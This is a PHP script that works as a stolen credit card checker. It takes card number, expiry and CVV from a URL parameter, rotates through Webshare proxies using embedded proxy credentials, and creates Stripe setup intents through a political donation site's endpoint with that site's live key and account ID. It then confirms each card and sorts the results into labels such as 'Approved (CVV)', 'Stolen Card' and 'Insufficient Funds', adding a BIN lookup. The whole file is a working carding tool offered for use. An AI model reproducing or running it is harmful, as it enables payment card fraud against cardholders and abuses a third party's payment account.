<?php

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function string_between_two_string($str, $starting_word, $ending_word){ 
$subtring_start = strpos($str, $starting_word); 
$subtring_start += strlen($starting_word);   
$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
return substr($str, $subtring_start, $size);
}

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////webshare account/////

/*$Webshare = rand(0,250);
$rp1 = array(
1 => 'trglsokk-dest:th83zubk0smi',
); 
$rotate = $rp1[array_rand($rp1)];
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
$ip = "Proxy Live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}*/

///////Webshare Token///////

////===[Webshare proxys for cc checker]===////
$Websharegay = rand(0,250);
$rp1 = array(
  1 => 'rytqezmt-rotate:w13lyrpkuxgn',
  ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
$ip = array(
  1 => 'socks5://p.webshare.io:80',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

$url = "https://api.ipify.org/";   
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
$ip = "LIVE!";
}
if (empty($ip1)){
$ip = "DEAD!:[".$rotate."]";
}

echo '[  IP: '.$ip.' ] ';


///////////////////////////////////////////////seti
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $credentials);
curl_setopt($ch, CURLOPT_URL, 'https://www.parrott2020.org/api/non_oauth/stripe_intents/setup_intents/create');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json',
'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
'content-type: application/json',
'cookie: __cfduid=d766aa596c97a1324c0ebdcb6b627a47c1613743750; cf:aff_sub2=; cf:aff_sub3=; cf:aff_sub=; cf:affiliate_id=; cf:cf_affiliate_id=; cf:content=; cf:medium=; cf:name=; cf:source=; cf:term=; cf:MzM3MTIzMjM=:visited=true; cf:visitor_id=863e3088-1503-46aa-9699-8c67dd88bf93; addevent_track_cookie=1c0060e1-666f-47d8-2706-6aecfde5ad98; t9dx4fq2r06xz5vy=true; 8233149_viewed_15=23; __stripe_mid=66a3d528-5c74-40ce-95b8-a61222abd93afcc289; __cf_bm=a7100a33607f9393ff1c5c2986012beef1416538-1615388169-1800-AQYksn/93uuKyVkR+tQNxuCAgxII/cvlTQB71L6qbl2YSqrB1CtdhKlK35YiIum0jDKguHFIFWTuD9V4X5bSF5p/fKNVOD3jyAxbzjvOkhOv',
'origin: https://www.parrott2020.org',
'referer: https://www.parrott2020.org/donate-page', 
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36'));
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"page_id":"NGU1Q2hSTXFnOTBJcjk1ZEk0elM0Zz09LS1xSld2NWlxYXN6NFFzbEw1cGtBbmtRPT0=--62b1728662353615bcb351dba6402f72ec5a4971","stripe_publishable_key":"pk_live_QNM4fX9VDG4nrXnJw5OavsoB00waXf9GrV","stripe_account_id":"acct_1FMlFiDFyKZHSeOF"}');
 $coli = curl_exec($ch);
 $seti = trim(strip_tags(getStr($coli,'"client_secret":"','"'))); 
$seti1 = trim(strip_tags(getstr($coli,'"client_secret":"','_secret_')));
///////////////////////////////////////////////   REQ 1

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/'.$seti1.'/confirm');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/setup_intents/seti_1ITTUQDFyKZHSeOFwCdza4ER/confirm',
'scheme: https',
'accept: application/json',
'accept-encoding: gzip, deflate, br',
'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36'));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][address][line1]=Oak+&payment_method_data[billing_details][address][city]=Olf&payment_method_data[billing_details][address][postal_code]=13420&payment_method_data[billing_details][address][state]=Ny&payment_method_data[billing_details][address][country]=US&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=NA&payment_method_data[muid]=66a3d528-5c74-40ce-95b8-a61222abd93afcc289&payment_method_data[sid]=NA&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F5db0321f4%3B+stripe-js-v3%2F5db0321f4&payment_method_data[time_on_page]=117325&payment_method_data[referrer]=https%3A%2F%2Fwww.parrott2020.org%2F&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=false&spc_eligible=false&key=pk_live_QNM4fX9VDG4nrXnJw5OavsoB00waXf9GrV&_stripe_account=acct_1FMlFiDFyKZHSeOF&client_secret='.$seti.'');
 $result = curl_exec($ch);
//echo $result1;
 /////////// [Bin Lookup Api] /////////////

$cctwo = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];
//$base= $HarryIsReborn0p

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}


///////===[Card Response]====////////

if(strpos($result, 'Payment Successful' )) {
    echo '<span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Card payment failed, please try another payment method" )) {
    echo '<span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"cvc_check":"pass",')){
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV))  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV)  </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Thank You." )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV)  </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"status": "succeeded"')){
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV))  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV - Incorrect Zip))  </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "the zip code you supplied failed validation" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV - Incorrect Zip)  )」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Success" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV))  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "succeeded." )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV))  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Fraudulent Card)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Fraudulent Card)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Insufficient Funds)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "insufficient_funds")) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Insufficient Funds)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "lost_card" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Lost Card)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "stolen_card" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Stolen Card)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Your card's security code is incorrect. (card_error)" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (CCN))  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result, "Your card's security code is incorrect." )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (CCN))  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
     }
elseif(strpos($result, "Your card's security code is incorrect." )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (CCN))  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (CCN))  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "incorrect_cvc" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (CCN))  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "pickup_card" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Pickup Card (Reported Stolen Or Lost))  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card has expired.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Expired Card)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "expired_card" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Expired Card)  </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "incorrect_cvc" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "pickup_card" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Pickup Card (Reported Stolen Or Lost))  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card has expired.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Expired Card)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "expired_card" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Expired Card)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result, 'Your card number is incorrect.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Incorrect Card Number)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "incorrect_number")) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Incorrect Card Number)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result1, "do_not_honor")) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Declined : Do_Not_Honor)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Card Declined)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Card Declined)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result, 'Your card was declined.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Card Declined)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result, "generic_decline")) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Declined : Generic_Decline)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"cvc_check": "unavailable"')){
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「CVC_Check : Unavailable)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result,'"cvc_check": "fail"')){
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「CVC_Unchecked : Fail)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"parameter_invalid_empty")){
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Declined : Missing Card Details)  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Card Doesnt Support Purchase)  」 </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"transaction_not_allowed")){
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Card Doesnt Support Purchas)  」 </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"three_d_secure_redirect")){
     echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Card Doesnt Support Purchase)  」 </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Card is declined by your bank, please contact them for additional confirmation.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「3D Secure Redirect)  」 </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"missing_payment_confirmation")){
     '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Missing Payment confirmations)  」 </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
     '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Missing Credit Card Numbe)  」 </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
else {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Dead Proxy/Error Not liste)  」 </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
curl_close($ch);
ob_flush();

echo "ASU1";
echo $result;
echo "<br>";
echo "ASU12";
echo $coli;
echo "<br>";
echo "ASU3";
echo $seti;
echo "<br>";
echo "ASU34";
echo $seti1;
//////////////////////////////////////
?>



